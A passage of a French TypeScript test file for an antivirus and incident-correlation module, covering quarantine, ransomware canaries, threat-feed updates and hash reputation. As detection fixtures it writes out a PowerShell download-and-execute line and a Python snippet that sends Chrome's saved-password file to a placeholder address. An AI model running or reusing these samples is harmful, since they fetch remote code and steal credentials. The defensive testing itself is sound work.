  assert.deepEqual(sw.filter((x) => x.kind === 'paquet').map((x) => x.value), ['com.exemple.espionx', 'org.autre.suivi']);
  assert.deepEqual(sw.filter((x) => x.kind === 'espion').map((x) => x.value), ['espionx.exemple.com', 'c2.espionx.exemple.com']); assert.deepEqual(sw.filter((x) => x.kind === 'ip').map((x) => x.value), ['203.0.113.77']);
  const kev = parseKev(JSON.stringify({ vulnerabilities: [{ cveID: 'CVE-2026-1234', vendorProject: 'Exemple', product: 'Serveur web', vulnerabilityName: 'Exécution de code', dateAdded: '2026-11-01', knownRansomwareCampaignUse: 'Known' }, { cveID: 'CVE-2025-1', vendorProject: 'A', product: 'B', vulnerabilityName: 'C', dateAdded: '2025-01-01', knownRansomwareCampaignUse: 'Unknown' }, { cveID: 'pas-un-cve' }] }));
  assert.equal(kev.length, 2); assert.equal(kev[0].ransomware, true); assert.equal(kev[1].ransomware, false); assert.deepEqual(parseKev('pas du json'), []);
  assert.deepEqual(parseClamHsb(`${h}:1024:Win.Trojan.Exemple-1\n${'e'.repeat(32)}:10:MD5.Ignoree\n${h2}:*:Unix.Malware.Autre-2:73\n`), [{ sha: h, family: 'Win.Trojan.Exemple-1' }, { sha: h2, family: 'Unix.Malware.Autre-2' }]);
  // Le catalogue des sources : chaque source dit sa licence, et les sources « référence » ne sont pas branchées.
  for (const s of SOURCES) { assert.ok(s.licence.length > 10, `${s.id} : licence ou conditions indiquées`); assert.equal(Boolean(s.fetch), s.mode === 'automatique' && s.id !== 'firehol', `${s.id} : ${s.mode}`); }
  assert.match(SOURCES.find((s) => s.id === 'virustotal')!.licence, /500 par jour.*interdite dans un produit ou service commercial/); assert.equal(SOURCES.find((s) => s.id === 'clamav')!.mode, 'référence', 'le moteur ClamAV n\'est pas intégré');
  assert.equal(reputationText({ sha: h, at: '', vt: { malicious: 41, suspicious: 2, harmless: 0, undetected: 25, label: 'trojan.agenttesla' } }).malicious, true);
  assert.equal(reputationText({ sha: h, at: '', vt: { malicious: 0, suspicious: 0, harmless: 5, undetected: 60 }, circl: { name: 'bash' } }).trusted, true);
  assert.equal(reputationText({ sha: h, at: '', vt: 'inconnu', mb: 'inconnu', circl: 'inconnu' }).malicious, false);
});

// ---------------------------------------------------------------- Les incidents (signaux reliés entre applis)
test('Ullr · incidents : un signal seul ne dit rien, deux applis qui se recoupent font un incident, et la réponse reste annulable', () => {
  const at = Date.parse('2026-11-11T10:00:00Z'), sig = (module: string, type: string, data: Record<string, unknown>, min = 0) => toSignal({ module, type, data }, at + min * 60_000)!;
  // Des signaux faibles, même nombreux, n'ouvrent rien : une machine chargée et un conteneur arrêté ne sont pas une attaque.
  let c = new Correlator();
  for (let i = 0; i < 20; i++) assert.equal(c.add(sig('eir', 'mesure', { cpu: 99 }, i)).incident, undefined);
  assert.equal(c.add(sig('naglfar', 'conteneur_arrete', { conteneur: 'web' }, 5)).incident, undefined);
  assert.equal(c.add(sig('skogul', 'port_ouvert', { port: 8080 }, 6)).incident, undefined);
  assert.equal(toSignal({ module: 'eir', type: 'mesure', data: { cpu: 40 } }), undefined, 'une mesure normale n\'est pas un signal');
  assert.equal(toSignal({ module: 'ullr', type: 'menace', data: { genre: 'test', fichier: '/tmp/eicar.com', gravité: 'moyenne' } }), undefined, 'le fichier de test EICAR n\'alimente pas les incidents');
  // Un processus suspect seul : pas d'incident. Avec le processeur saturé : incident (programme suspect actif).
  c = new Correlator();
  assert.equal(c.add(sig('skogul', 'suspect', { règle: 'mineur', pid: 4242, détail: '/tmp/.x/kworker' })).incident, undefined);
  const r1 = c.add(sig('eir', 'mesure', { cpu: 99 }, 2));
  assert.equal(r1.incident?.kind, 'programme suspect'); assert.equal(r1.announce, true); assert.deepEqual(r1.incident?.proposed, ['tue le processus 4242'], 'tuer un processus est proposé, jamais fait d\'office');
  assert.deepEqual(r1.responses, []);
  // Le même programme parle ensuite à une adresse malveillante : l'incident s'aggrave, l'adresse extérieure est bannie.
  const r2 = c.add(sig('geri', 'malveillant', { ip: '203.0.113.66', programme: 'kworker' }, 3));
  assert.equal(r2.incident?.id, r1.incident?.id, 'même incident'); assert.equal(r2.incident?.kind, 'compromission'); assert.equal(r2.announce, true, 'annoncé de nouveau car il s\'aggrave');
  assert.deepEqual(r2.responses, [{ kind: 'bannir', ip: '203.0.113.66', why: 'incident « Cette machine communique avec un attaquant »' }]);
  assert.ok(r2.incident!.score >= 60 && r2.incident!.apps.length === 3);
  assert.deepEqual(c.add(sig('geri', 'malveillant', { ip: '203.0.113.66', programme: 'kworker' }, 4)).responses, [], 'jamais deux fois le même bannissement');
  assert.equal(c.incidents.length, 1);
  // Une adresse du réseau local n'est jamais bannie, même dans un incident grave.
  c = new Correlator();
  c.add(sig('skogul', 'suspect', { règle: 'x', pid: 7, détail: 'outil' }));
  assert.deepEqual(c.add(sig('geri', 'malveillant', { ip: '192.168.1.50', programme: 'outil' }, 1)).responses, []);
  // Rançongiciel : un fichier sentinelle touché suffit, tout de suite, au niveau critique.
  c = new Correlator();
  const r3 = c.add(sig('ullr', 'sentinelle', { fichier: '/home/awa/Documents/!000-ne-pas-toucher.docx', action: 'modifié' }));
  assert.equal(r3.incident?.kind, 'rançongiciel'); assert.equal(r3.incident?.level, 'critique'); assert.match(r3.incident!.proposed.join(' '), /restaure les fichiers depuis Sindri/);
  // Mot de passe d'Odin : 4 refus ne font rien, le 5e ouvre un incident, le 7e bannit l'adresse (extérieure).
  c = new Correlator(); let last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }));
  for (let i = 1; i < 4; i++) last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }, i));
  assert.equal(last.incident, undefined);
  last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }, 5));
  assert.equal(last.incident?.kind, 'force brute'); assert.deepEqual(last.responses, []);
  last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }, 6)); last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }, 7));
  assert.deepEqual(last.responses.map((x) => x.ip), ['203.0.113.200']); assert.equal(last.incident?.level, 'haute');
  // Un pirate dans un piège, déjà banni par Loki : ce n'est pas un incident (le piège fait son travail), et pas de double bannissement.
  c = new Correlator();
  for (let i = 0; i < 8; i++) { c.add(sig('loki', 'piege', { piège: 'narfi', ip: '203.0.113.9', type: 'identifiants', détail: 'root / 123456' }, i)); c.add(sig('garmr', 'banni', { ip: '203.0.113.9', raison: 'piège' }, i)); }
  assert.equal(c.incidents.length, 0);
  // …mais s'il s'attaque aussi à la porte d'Odin, c'est une attaque ciblée.
  const r4 = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.9' }, 9));
  assert.equal(r4.incident?.kind, 'attaque ciblée'); assert.deepEqual(r4.responses, [], 'déjà banni par Loki : pas de second bannissement');
  // Score : borné, et un simple contexte répété ne gonfle pas.
  assert.ok(score(Array.from({ length: 50 }, () => sig('eir', 'mesure', { cpu: 99 }))) < 30);
  assert.equal(c.set(r4.incident!.id, 'traité')?.state, 'traité');
  assert.ok(SENSORS.length >= 9 && SENSORS.every((s) => s.what && s.when));
});

// ---------------------------------------------------------------- L'appli (analyses, quarantaine, mises à jour, liens)
interface World { v: Valhalla; home: string; sent: string[]; fetched: Array<{ url: string; method: string; body: string }>; ran: string[]; routes: Array<[RegExp, (url: string, init?: RequestInit) => Response]>; end(): void }
function world(o: { keys?: boolean } = {}): World {
  const home = mkdtempSync(join(tmpdir(), 'odin-ullr-')), sent: string[] = [], fetched: World['fetched'] = [], ran: string[] = [], routes: World['routes'] = [];
  const saved = { ABUSE_CH_KEY: process.env.ABUSE_CH_KEY, VT_API_KEY: process.env.VT_API_KEY };
  if (o.keys) Object.assign(process.env, { ABUSE_CH_KEY: 'cle-abuse-de-test', VT_API_KEY: 'cle-vt-de-test' }); else { delete process.env.ABUSE_CH_KEY; delete process.env.VT_API_KEY; }
  const fakeFetch = (async (input: string | URL, init?: RequestInit) => {
    const url = String(input); fetched.push({ url, method: init?.method ?? 'GET', body: typeof init?.body === 'string' ? init.body : '' });
    for (const [re, fn] of routes) if (re.test(url)) return fn(url, init);
    return new Response('introuvable', { status: 404 });
  }) as unknown as typeof fetch;
  const v = new Valhalla(home, allModules({ paths: { home, workspace: join(home, 'workspace') }, cfg: { venus: { url: '' }, voice: {} } } as never), {
    run: async (cmd, args) => { ran.push(`${cmd} ${args.join(' ')}`); return { code: /command -v/.test(args.join(' ')) ? 0 : cmd === 'dpkg-query' ? 0 : 0, out: cmd === 'dpkg-query' ? 'openssl\nnginx\nexemple-serveur\n' : '', err: '' }; },
    fetch: fakeFetch, notify: async (t) => { sent.push(t); }, autonomy: () => 'equilibre',
  });
  const unwire = wireReflexes(v);
  return { v, home, sent, fetched, ran, routes, end: () => { unwire(); v.stop(); for (const [k, val] of Object.entries(saved)) { if (val === undefined) delete process.env[k]; else process.env[k] = val; } rmSync(home, { recursive: true, force: true }); } };
}
const act = (w: World, action: string, input: Record<string, unknown> = {}) => w.v.act('ullr', action, input);

test('Ullr · analyse d\'un dossier : rapport horodaté, menace sûre mise en quarantaine (annulable), soupçon laissé à ta décision, EICAR laissé en place', async () => {
  const w = world();
  try {
    const d = join(w.home, 'workspace', 'inbox'); mkdirSync(join(d, 'sous'), { recursive: true }); mkdirSync(join(d, 'exclu'), { recursive: true });
    writeFileSync(join(d, 'note.txt'), 'Bonjour'); writeFileSync(join(d, 'eicar.com'), EICAR); writeFileSync(join(d, 'sous', 'shell.php'), WEBSHELL);
    writeFileSync(join(d, 'maj.ps1'), 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a.ps1")'); writeFileSync(join(d, 'exclu', 'autre.php'), WEBSHELL);
    writeFileSync(join(d, 'vide.txt'), ''); symlinkSync(d, join(d, 'boucle'));
    assert.deepEqual([...walk(d)].map((f) => f.slice(realpathSync(d).length + 1).replace(/\\/g, '/')).sort(), ['eicar.com', 'exclu/autre.php', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'les liens symboliques ne sont pas suivis (pas de boucle)');
    // Un dossier donné par un lien (ou un dossier temporaire lié, comme sur macOS) : les exclusions tiennent quand même.
    const lien = join(w.home, 'lien-inbox'); symlinkSync(d, lien);
    assert.deepEqual([...walk(lien, [join(lien, 'exclu')])].map((f) => f.slice(realpathSync(d).length + 1).replace(/\\/g, '/')).sort(), ['eicar.com', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'exclusion donnée par le chemin du lien');
    const r = await act(w, 'analyser', { dossier: d, exclusions: join(d, 'exclu') });
    assert.equal(r.ok, true); assert.match(r.text, /5 fichiers analysés[\s\S]*3 détection\(s\)/);
    assert.match(r.text, /\[critique\] PHP\.Webshell \(eval encodé\) — .*sous[\\/]shell\.php \(en quarantaine\)/);
    assert.match(r.text, /\[moyenne\] Test antivirus EICAR — .*eicar\.com \(fichier de test, laissé en place\)/);
    assert.match(r.text, /\[moyenne\] Télécharge et exécute en une seule commande — .*maj\.ps1 \(à vérifier\)/);
    assert.ok(!existsSync(join(d, 'sous', 'shell.php')), 'le webshell a quitté sa place'); assert.ok(existsSync(join(d, 'eicar.com')) && existsSync(join(d, 'maj.ps1')) && existsSync(join(d, 'exclu', 'autre.php')));
    // Le fichier en quarantaine est neutralisé : ni son contenu ni son nom d'origine.
    const q = (w.v.ctx('ullr').settings.quarantine as Array<{ id: string; file: string; sha256: string }>)[0];
    const stored = readFileSync(join(w.home, 'valhalla', 'ullr', 'quarantaine', q.id));
    assert.ok(!stored.includes('eval(base64_decode'), 'le contenu en quarantaine est brouillé'); assert.equal(q.sha256, sha(WEBSHELL));
    // C'est une manip : annoncée, annulable. « annule » remet le fichier, identique.
    const m = w.v.manips({ module: 'ullr' })[0];
    assert.equal(m.action, 'isoler'); assert.equal(m.by, 'réflexe'); assert.equal(m.state, 'à décider'); assert.equal(m.undo?.action, 'restaurer');
    assert.ok(w.sent.some((s) => /Manip faite par réflexe : Ullr · Mettre en quarantaine/.test(s) && /annule/.test(s)), 'tu es prévenu, avec le moyen d\'annuler');
    assert.ok(w.sent.some((s) => /Ullr — Ullr : PHP\.Webshell/.test(s)), 'l\'alerte critique part sur ta messagerie');
    assert.ok(!w.sent.some((s) => /EICAR/.test(s)), 'le fichier de test ne dérange personne (alerte moyenne, dans le fil seulement)');
    assert.equal((await w.v.decide(m.id, false)).ok, true);
    assert.equal(readFileSync(join(d, 'sous', 'shell.php'), 'utf8'), WEBSHELL, 'fichier restauré à l\'identique');
    // Rapport : chemin, empreinte, règle, gravité, action, version des signatures.
    const rep = await act(w, 'rapport');
    assert.match(rep.text, new RegExp(`empreinte ${sha(WEBSHELL)} · trouvé par règle \\+ heuristique · action : en quarantaine · T1505\\.003`)); assert.match(rep.text, /base de signatures version 0/); assert.match(rep.text, /5 fichiers/);
    // Exception sur un dossier, puis fausse alerte : le fichier n'est plus signalé.
    await act(w, 'exception', { quoi: join(d, 'sous') });
    assert.match((await act(w, 'fichier', { chemin: join(d, 'sous', 'shell.php') })).text, /introuvable, vide, ou dans tes exceptions : /);
    const det = (w.v.ctx('ullr').settings.hits as Array<{ id: string; file: string }>).find((x) => x.file.endsWith('maj.ps1'))!;
    assert.match((await act(w, 'faux_positif', { detection: det.id })).text, /déclaré sain/);
    assert.match((await act(w, 'fichier', { chemin: join(d, 'maj.ps1') })).text, /^✓ Rien de dangereux/);
    assert.match((await act(w, 'exceptions')).text, /dossier .*sous[\s\S]*empreinte [a-f0-9]{64}/);
    await assert.rejects(async () => { const x = await act(w, 'exception', { quoi: '/' }); if (x.ok === false) throw new Error(x.text); }, /trop large/);
    // Verdict d'un fichier seul : commence par ⚠, donne le type réel et l'empreinte (Loki et Skögul s'en servent).
    const one = await act(w, 'fichier', { chemin: join(d, 'eicar.com') });
    assert.match(one.text, /^⚠ Test antivirus EICAR \(règle\) — score 40\/100/); assert.match(one.text, new RegExp(`empreinte SHA-256 : ${sha(EICAR)}`));
    // Un fichier du système n'est jamais déplacé tout seul.
    const vital = process.platform === 'win32' ? join(process.env.SystemRoot ?? 'C:\\Windows', 'System32', 'cmd.exe') : '/usr/bin/env';
    assert.match((await act(w, 'isoler', { fichier: vital })).text, /fichier du système/);
    assert.ok(existsSync(vital));
  } finally { w.end(); }
});

test('Ullr · chemins Linux, macOS et Windows : dossiers en exception et fichiers du système', () => {
  assert.equal(excepted(['/home/awa/projets'], '/home/awa/projets/a/b.php'), true);
  assert.equal(excepted(['/home/awa/projets/'], '/home/awa/projets'), true, 'le dossier lui-même');
  assert.equal(excepted(['/home/awa/projets'], '/home/awa/projets-secrets/b.php'), false, 'un dossier au nom voisin n\'est pas couvert');
  assert.equal(excepted(['C:\\Users\\awa\\Projets'], 'C:\\Users\\awa\\Projets\\site\\shell.php'), true, 'chemin Windows');
  assert.equal(excepted(['C:\\Users\\awa\\Projets'], 'C:\\Users\\awa\\ProjetsX\\shell.php'), false);
  assert.equal(excepted([], '/home/awa/a.php'), false);
  // Ce dont la machine a besoin pour démarrer n'est jamais déplacé ; les dossiers temporaires et /usr/local, si.
  for (const f of ['/usr/bin/env', '/etc/passwd', '/System/Library/CoreServices/boot.efi', '/private/etc/hosts', 'C:\\Windows\\System32\\cmd.exe', 'c:\\windows\\system32\\drivers\\etc\\hosts', 'C:\\Program Files\\Appli\\appli.exe']) assert.equal(vital(f), true, f);
  for (const f of ['/home/awa/a.sh', '/usr/local/bin/outil', '/tmp/x', '/Library/LaunchDaemons/x.plist', 'C:\\Users\\awa\\Downloads\\x.exe', 'C:\\Windows\\Temp\\x.exe']) assert.equal(vital(f), false, f);
});

test('Ullr · dans un dossier de tests d\'un projet, une règle ne déplace rien : c\'est toi qui décides', async () => {
  const w = world();
  try {
    const d = join(w.home, 'projets', 'site', 'tests', 'fixtures'); mkdirSync(d, { recursive: true }); writeFileSync(join(d, 'shell.php'), WEBSHELL);
    const r = await act(w, 'analyser', { dossier: join(w.home, 'projets') });
    assert.match(r.text, /PHP\.Webshell.*\(à vérifier\)/); assert.ok(existsSync(join(d, 'shell.php')));
    assert.match((w.v.ctx('ullr').settings.hits as Array<{ why: string[] }>)[0].why.join(' '), /dossier de tests ou d'exemples/);
  } finally { w.end(); }
});

test('Ullr · protection en continu : un fichier qui arrive est analysé tout seul ; fichiers sentinelles contre les rançongiciels', async () => {
  const w = world();
  try {
    const inbox = join(w.home, 'workspace', 'inbox'), docs = join(w.home, 'Documents'); mkdirSync(inbox, { recursive: true }); mkdirSync(docs, { recursive: true });
    ullr.start!(w.v.ctx('ullr'));
    await wait(150);
    writeFileSync(join(inbox, 'recu.php'), WEBSHELL); writeFileSync(join(inbox, 'photo.txt'), 'rien');
    assert.ok(await until(() => !existsSync(join(inbox, 'recu.php'))), 'le fichier dangereux est mis en quarantaine sans rien demander');
    assert.ok(existsSync(join(inbox, 'photo.txt'))); assert.equal(w.v.manips({ module: 'ullr' })[0].action, 'isoler');
    // Sentinelles : deux faux documents ; si l'un change, c'est un incident « rançongiciel » immédiat.
    assert.match((await act(w, 'sentinelles', { dossier: docs })).text, /Sentinelles posées/);
    const canary = join(docs, '!000-ne-pas-toucher.docx'); assert.ok(existsSync(canary));
    await wait(200); writeFileSync(canary, 'CHIFFRÉ PAR UN RANÇONGICIEL');
    assert.ok(await until(() => w.v.alerts({ module: 'ullr' }).some((a) => /Incident : Comportement de rançongiciel/.test(a.title))), 'incident ouvert');
    const a = w.v.alerts({ module: 'ullr' }).find((x) => /rançongiciel/.test(x.title))!;
    assert.equal(a.level, 'critique'); assert.match(a.detail ?? '', /fichier sentinelle a été modifié[\s\S]*restaure les fichiers depuis Sindri/);
    assert.match((await act(w, 'incidents')).text, /Comportement de rançongiciel[\s\S]*ouvert/);
    // Lien avec le Cerveau : l'incident a sa note, reliée aux applis ; la classer complète la note.
    assert.ok(await until(() => existsSync(join(w.home, 'cerveau')) && readdirSync(join(w.home, 'cerveau')).some((f) => /^Incident /.test(f))), 'note de l\'incident dans le Cerveau');
    const note = join(w.home, 'cerveau', readdirSync(join(w.home, 'cerveau')).find((f) => /^Incident /.test(f))!);
    assert.match(readFileSync(note, 'utf8'), /#sécurité #incident[\s\S]*fichier sentinelle[\s\S]*\[\[Ullr\]\]/);
    const id = (w.v.ctx('ullr').settings.incidents as Array<{ id: string }>)[0].id;
    assert.match((await act(w, 'incident', { incident: id, etat: 'traité' })).text, /traité/);
    assert.ok(await until(() => /Incident classé : traité/.test(readFileSync(note, 'utf8'))));
    // Protection coupée : plus rien n'est surveillé.
    assert.match((await act(w, 'protection', { actif: false })).text, /coupée[\s\S]*0 dossier\(s\) surveillé\(s\)/);
  } finally { w.end(); }
});

test('Ullr · mises à jour : sources interrogées, paquet testé puis activé, empreinte connue détectée, base polluée refusée, retour arrière', async () => {
  const w = world({ keys: true });
  try {
    const sample = Buffer.from(`échantillon inoffensif ${Math.random()}`), d = join(w.home, 'workspace', 'inbox'); mkdirSync(d, { recursive: true });
    const csv = (hashes: string[]) => `# MalwareBazaar\n${hashes.map((h) => `"2026-11-10 10:00:00", "${h}", "m", "s", "abuse_ch", "f.exe", "exe", "application/x-dosexec", "AgentTesla", "n/a", "45", "", "", ""`).join('\n')}\n`;
    let mbHashes = [sha(sample)];
    w.routes.push(
      [/mb-api\.abuse\.ch\/v2\/files\/exports\/cle-abuse-de-test\/recent\.csv/, () => new Response(csv(mbHashes))],
      [/threatfox-api\.abuse\.ch/, () => Response.json({ query_status: 'ok', data: [{ ioc: 'c2.mechant-exemple.fr', ioc_type: 'domain', confidence_level: 100, malware_printable: 'Lumma' }] })],
      [/urlhaus\.abuse\.ch\/downloads\/text_online/, () => new Response('http://distribue.mechant-exemple.net/a.exe\n')],
      [/openphish\/public_feed/, () => new Response('https://faux-paypal.mechant-exemple.org/login\n')],
      [/stalkerware-indicators/, () => new Response('- name: EspionX\n  packages:\n  - com.exemple.espionx\n  websites:\n  - espionx-exemple.com\n')],
      [/signature-base\/master\/yara\/thor-webshells\.yar/, () => new Response('rule Essai_Marqueur_Webshell {\n  meta:\n    description = "webshell de test"\n    score = 85\n  strings:\n    $a = "MARQUEUR-WEBSHELL-ESSAI-7781"\n  condition:\n    $a\n}\nrule Trop_Large {\n  strings:\n    $a = "#!/"\n  condition:\n    $a\n}\n')],
      [/known_exploited_vulnerabilities\.json/, () => Response.json({ vulnerabilities: [{ cveID: 'CVE-2026-4242', vendorProject: 'Exemple', product: 'Serveur', vulnerabilityName: 'Exécution de code à distance', dateAdded: new Date().toISOString().slice(0, 10), knownRansomwareCampaignUse: 'Known' }] })],
    );
    const up = await act(w, 'mettre_a_jour');
    for (const re of [/✓ MalwareBazaar : 1 empreintes/, /✓ ThreatFox : 1 indicateurs/, /✓ URLhaus : 1 sites/, /✓ OpenPhish \(flux public\) : 1 hameçonnage/, /✓ Stalkerware Indicators : 2 logiciels espions/, /✓ signature-base \(règles YARA\) : 1 règles \(fichiers absents : /, /✓ CISA KEV : 1 failles/, /Base version 1 activée \(signée, testée\) : 1 empreintes, \d+ indicateurs/]) assert.match(up.text, re);
    assert.match(up.text, /1 mises de côté \(fausses alertes sur des fichiers sains\)/, 'une règle importée qui se déclenche sur des fichiers sains est écartée toute seule');
    assert.ok(!up.text.includes('cle-abuse-de-test'), 'la clé n\'apparaît jamais dans le compte rendu');
    assert.ok(w.fetched.every((f) => !f.body.includes('échantillon')), 'aucun contenu de fichier n\'est envoyé');
    // Empreinte connue : détectée et mise en quarantaine, avec la famille.
    writeFileSync(join(d, 'facture.exe'), sample);
    const r = await act(w, 'analyser', { dossier: d });
    assert.match(r.text, /\[critique\] Malware connu : AgentTesla — .*facture\.exe \(en quarantaine\)/); assert.ok(!existsSync(join(d, 'facture.exe')));
    // Règle YARA importée en service ; indicateurs de sites en service.
    writeFileSync(join(d, 'x.php'), '<?php // MARQUEUR-WEBSHELL-ESSAI-7781');
    assert.match((await act(w, 'fichier', { chemin: join(d, 'x.php') })).text, /⚠ Essai_Marqueur_Webshell \(règle\)/);
    assert.match((await act(w, 'adresse', { lien: 'https://faux-paypal.mechant-exemple.org/login' })).text, /⚠ Adresse connue comme dangereuse \(hameçonnage, source openphish\)/);
    assert.match((await act(w, 'adresse', { lien: 'http://sous.espionx-exemple.com' })).text, /logiciel espion/);
    assert.match((await act(w, 'adresse', { lien: 'https://toufatech.com' })).text, /^✓ Rien de suspect/);
    assert.match((await act(w, 'adresse', { lien: 'http://paypa1.com' })).text, /Imite une marque en changeant des lettres/);
    assert.match((await act(w, 'message', { texte: 'Votre colis est en attente : http://distribue.mechant-exemple.net/a.exe' })).text, /Lien connu comme dangereux[\s\S]*Ne clique sur aucun lien/);
    assert.match((await act(w, 'failles')).text, /1 failles exploitées connues[\s\S]*CVE-2026-4242 · Exemple Serveur[\s\S]*rançongiciels/);
    assert.match((await act(w, 'sources')).text, /MalwareBazaar \(empreintes\) : 1 le \d{4}[\s\S]*VirusTotal \(réputation\) : à la demande · prête[\s\S]*FireHOL et Feodo Tracker \(adresses IP\) : tenue à jour par l'appli Geri[\s\S]*ClamAV \(référence\) : référence, non branchée/);
    assert.match((await act(w, 'versions')).text, /version 1 \(en service\).*✓ signature valide/);
    // Une liste polluée (elle contient un fichier sain du système) est refusée : l'ancienne version reste.
    mbHashes = [sha(readFileSync(new URL('../src/valhalla/types.ts', import.meta.url)))];
    const bad = await act(w, 'mettre_a_jour', { source: 'malwarebazaar' });
    assert.match(bad.text, /mise à jour refusée : un fichier sain du système .* figure dans les empreintes de malwares\. La version 1 reste en service/);
    assert.ok(w.v.alerts({ module: 'ullr' }).some((a) => /mise à jour des signatures refusée/.test(a.title)));
    assert.match((await act(w, 'versions')).text, /^- version 1 \(en service\)/);
    // Nouvelle version saine, puis retour arrière.
    mbHashes = [sha('autre échantillon')];
    assert.match((await act(w, 'mettre_a_jour', { source: 'malwarebazaar' })).text, /Base version 3 activée|Base version 2 activée/);
    assert.match((await act(w, 'revenir')).text, /Retour à la version 1 des signatures \(1 empreintes\)/);
    // Import manuel : empreintes au format ClamAV (.hsb).
    const hsb = join(w.home, 'perso.hsb'); writeFileSync(hsb, `${sha('importé')}:7:Essai.Importe-1\n`);
    assert.match((await act(w, 'importer', { chemin: hsb })).text, /1 empreinte\(s\) importée\(s\)/);
    writeFileSync(join(d, 'i.bin'), 'importé'); assert.match((await act(w, 'fichier', { chemin: join(d, 'i.bin') })).text, /Malware connu : Essai\.Importe-1/);
  } finally { w.end(); }
});

test('Ullr · réputation en ligne : seule l\'empreinte part, jamais le fichier ; un soupçon confirmé devient une quarantaine, un fichier connu comme sain est calmé', async () => {
  const w = world({ keys: true });
  try {
    const d = join(w.home, 'workspace', 'inbox'); mkdirSync(d, { recursive: true });
    const bad = 'import os,requests\nd=open(os.path.expanduser("~/.config/google-chrome/Default/Login Data"),"rb").read()\nrequests.post("http://203.0.113.5/u",data=d) # secret-du-fichier-A\n';
    const good = 'import os,requests\nd=open(os.path.expanduser("~/.config/chromium/Default/Login Data"),"rb").read()\nrequests.post("https://ma-sauvegarde.exemple.fr/u",data=d) # secret-du-fichier-B\n';
    w.routes.push(
      [/virustotal\.com\/api\/v3\/files\//, (url) => (url.endsWith(sha(bad)) ? Response.json({ data: { attributes: { last_analysis_stats: { malicious: 38, suspicious: 1, harmless: 0, undetected: 30 }, popular_threat_classification: { suggested_threat_label: 'trojan.stealer' } } } }) : new Response('{}', { status: 404 }))],
      [/mb-api\.abuse\.ch\/api\/v1/, () => Response.json({ query_status: 'hash_not_found' })],
      [/hashlookup\.circl\.lu/, (url) => (url.endsWith(sha(good)) ? Response.json({ FileName: 'sauvegarde-navigateur.py', ProductName: 'Outil de sauvegarde' }) : new Response('{}', { status: 404 }))],
    );
    writeFileSync(join(d, 'a.py'), bad);
    const r = await act(w, 'analyser', { dossier: d });
    assert.match(r.text, /\[critique\] Lit les mots de passe du navigateur et les envoie ailleurs — .*a\.py \(en quarantaine\)/, 'soupçon confirmé par la réputation');
    assert.match((w.v.ctx('ullr').settings.hits as Array<{ why: string[] }>)[0].why.join(' '), /VirusTotal : 39 antivirus sur 69 le jugent dangereux \(trojan\.stealer\)/);
    writeFileSync(join(d, 'b.py'), good);
    const r2 = await act(w, 'analyser', { dossier: d });
    assert.match(r2.text, /\[moyenne\] Lit les mots de passe.*b\.py \(à vérifier\)/); assert.ok(existsSync(join(d, 'b.py')));
    assert.match((w.v.ctx('ullr').settings.hits as Array<{ file: string; why: string[] }>).find((h) => h.file.endsWith('b.py'))!.why.join(' '), /CIRCL : fichier connu d'un logiciel légitime.*probablement une fausse alerte/);
    // Rien d'autre que des empreintes n'est parti, la clé est dans l'en-tête (jamais dans l'adresse), une seule demande par empreinte (cache).
    const net = w.fetched.filter((f) => /virustotal|abuse\.ch|circl/.test(f.url));
    assert.ok(net.length >= 4 && net.every((f) => !/secret-du-fichier/.test(f.url + f.body)), 'aucun contenu de fichier envoyé');
    assert.ok(net.every((f) => !f.url.includes('cle-vt-de-test')));
    assert.ok(net.filter((f) => /virustotal/.test(f.url)).every((f) => /\/files\/[a-f0-9]{64}$/.test(f.url) && f.method === 'GET'), 'VirusTotal : consultation d\'une empreinte, jamais d\'envoi');
    const before = w.fetched.length; assert.match((await act(w, 'reputation', { empreinte: sha(bad) })).text, /VirusTotal : 39 antivirus/); assert.equal(w.fetched.length, before, 'réponse gardée 7 jours : pas de nouvelle demande');
    // Quota VirusTotal (4 par minute) : la demande suivante immédiate ne part pas vers VirusTotal.
    await act(w, 'reputation', { empreinte: 'f'.repeat(64) });
    assert.ok(!w.fetched.slice(before).some((f) => /virustotal/.test(f.url)), 'pas plus d\'une demande VirusTotal toutes les 16 secondes');
    await assert.rejects(async () => { const x = await act(w, 'reputation', { empreinte: 'pas une empreinte' }); if (x.ok === false) throw new Error(x.text); }, /empreinte SHA-256 attendue/);
  } finally { w.end(); }
});

test('Ullr · sans clé ni réseau : il fonctionne quand même (règles de base), et le dit', async () => {
  const w = world();
  try {
    const up = await act(w, 'mettre_a_jour');
    assert.match(up.text, /○ MalwareBazaar : clé absente \(ABUSE_CH_KEY\), source en attente/); assert.match(up.text, /✗ OpenPhish/);
    assert.match((await act(w, 'versions')).text, /Aucune mise à jour pour l'instant : les règles de base sont en service/);
    assert.match((await act(w, 'failles')).text, /pas encore chargé/);
    assert.match((await act(w, 'reputation', { empreinte: 'a'.repeat(64) })).text, /CIRCL|Aucune source/);
    const d = join(w.home, 'x'); mkdirSync(d); writeFileSync(join(d, 'eicar.com'), EICAR);
    assert.match((await act(w, 'analyser', { dossier: d })).text, /Test antivirus EICAR/);
    assert.match((await act(w, 'analyser', { dossier: join(w.home, 'absent') })).text, /rien à analyser/);
  } finally { w.end(); }
});

test('Ullr · clés des sources : rangées avec les secrets d\'Odin, jamais affichées, forme vérifiée', async () => {
  const w = world(), saved: Array<[string, string]> = [];
  try {
    ullrKeys((n, v) => { saved.push([n, v]); process.env[n] = v; });
    assert.match((await act(w, 'cles')).text, /Clé abuse\.ch : absente · clé VirusTotal : absente/);
    assert.match((await act(w, 'cles', { abuse_ch: 'avec espace interdit' })).text, /n'a pas la bonne forme/);
    assert.deepEqual(saved, []);
    w.routes.push([/abuse\.ch/, () => new Response('', { status: 401 })]);
    const r = await act(w, 'cles', { abuse_ch: 'CleSecreteDeTest0123456789', virustotal: 'AutreCleSecrete9876543210abcdef' });
    assert.deepEqual(saved, [['ABUSE_CH_KEY', 'CleSecreteDeTest0123456789'], ['VT_API_KEY', 'AutreCleSecrete9876543210abcdef']]);
